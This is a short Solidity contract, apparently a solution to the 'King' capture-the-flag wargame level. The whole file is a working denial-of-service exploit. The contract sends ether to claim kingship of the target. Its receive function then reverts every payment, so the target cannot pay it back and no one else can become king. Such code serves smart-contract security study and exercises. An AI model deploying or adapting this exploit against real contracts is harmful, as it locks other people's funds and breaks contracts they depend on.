// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns (uint);
    function king() external view returns (address);
}

contract KingAttack {
    address public target;

    constructor(address _target) payable {
        target = _target;

        // Become king by sending prize amount
        (bool success, ) = _target.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // Reject any ETH received to lock the contract
    receive() external payable {
        revert("I refuse the throne");
    }
}
